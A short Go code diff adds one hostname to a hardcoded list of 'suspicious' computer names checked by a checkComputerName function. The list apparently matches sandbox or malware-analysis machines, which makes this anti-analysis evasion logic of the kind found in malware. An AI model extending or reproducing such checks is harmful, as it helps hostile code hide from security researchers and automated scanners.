@@ -70,7 +70,7 @@ func checkUsername() bool {
 func checkComputerName() bool {
 	computerName := strings.TrimSpace(strings.ToLower(os.Getenv("COMPUTERNAME")))
 	suspiciousNames := []string{
-		"desktop-c8gqkg7", "maspenc", "desktop-dsmevvl", "desktop-et51ajO", "win-5e07c0s9alr",
+		"desktop-c8gqkg7", "maspenc", "desktop-dsmevvl", "desktop-et51ajO", "win-5e07c0s9alr", "dorispalme",
 	}
 	return slices.Contains(suspiciousNames, computerName)
 }
